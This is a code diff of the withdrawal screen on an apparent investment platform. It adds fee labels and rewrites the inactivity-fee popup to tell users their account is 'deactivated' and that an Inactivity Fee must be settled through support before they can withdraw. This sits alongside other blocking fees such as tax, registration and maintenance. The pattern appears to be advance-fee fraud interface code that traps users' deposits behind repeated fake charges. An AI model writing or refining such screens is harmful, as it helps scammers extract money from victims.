@@ -54,11 +54,20 @@ export default function Withdraw() {
   const inputStyle = { width: '100%', background: t.inputBg, border: `1px solid ${t.border}`, color: t.text, fontSize: '10px', padding: '10px 12px', outline: 'none', boxSizing: 'border-box' };
   const labelStyle = { color: t.subText, fontSize: '9px', display: 'block', marginBottom: '6px', fontWeight: '600' };
 
+  const FEE_LABELS = {
+    processing: 'Withdrawal Processing Fee',
+    tax: 'Tax / Compliance Fee',
+    conversion: 'Asset Conversion Fee',
+    inactivity: 'Inactivity Fee',
+    maintenance: 'Account Maintenance Fee',
+    registration: 'Registration Fee',
+  };
+
   const FEE_DESCRIPTIONS = {
     processing: 'A Withdrawal Processing Fee covers the administrative and operational costs required to securely process your withdrawal request, including payment gateway charges and transaction verification.',
     tax: 'A Tax / Compliance Fee is a mandatory regulatory charge that ensures your withdrawal complies with applicable tax laws and financial regulations governing international fund transfers.',
     conversion: 'A Currency Conversion Fee is applied to cover the cost of converting your funds between currencies or cryptocurrency pairs at the current market exchange rate.',
-    inactivity: 'An Inactivity Fee is applied to accounts with no recent trading or investment activity. This fee maintains your account in active standing within our platform.',
+    inactivity: 'Your account has been temporarily deactivated due to inactivity. To reactivate your account and resume full access to all platform features including withdrawals, the Inactivity Fee must be settled. Please contact support to complete this process.',
     maintenance: 'An Account Maintenance Fee covers the ongoing costs of securing and maintaining your trading account, including platform access, security monitoring, and dedicated support.',
     registration: 'A Registration Fee is required to fully activate your trading account and unlock complete access to all platform investment and withdrawal features.',
   };
@@ -448,8 +457,12 @@ export default function Withdraw() {
             <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
               <svg width='22' height='22' fill='none' stroke='#ef4444' viewBox='0 0 24 24' strokeWidth='2'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
             </div>
-            <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '4px' }}>{feePopup.type === 'registration' ? 'Action Required' : 'Unable to Process Withdrawal'}</div>
-            <div style={{ color: '#ef4444', fontSize: '11px', fontWeight: '600', marginBottom: '12px' }}>{feePopup.type === 'registration' ? `${feePopup.label} Not Settled` : `${feePopup.label} Required`}</div>
+            <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '4px' }}>
+              {feePopup.type === 'registration' ? 'Action Required' : feePopup.type === 'inactivity' ? 'Account Deactivated' : 'Unable to Process Withdrawal'}
+            </div>
+            <div style={{ color: '#ef4444', fontSize: '11px', fontWeight: '600', marginBottom: '12px' }}>
+              {feePopup.type === 'inactivity' ? 'Inactivity Fee Required' : `${FEE_LABELS[feePopup.type] || feePopup.label} Not Settled`}
+            </div>
             <div style={{ color: '#ef4444', fontSize: '11px', fontWeight: '600', marginBottom: '12px' }}>{feePopup.label} Not Settled</div>
             <div style={{ color: '#555', fontSize: '10px', marginBottom: '16px', lineHeight: '1.8' }}>
               {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
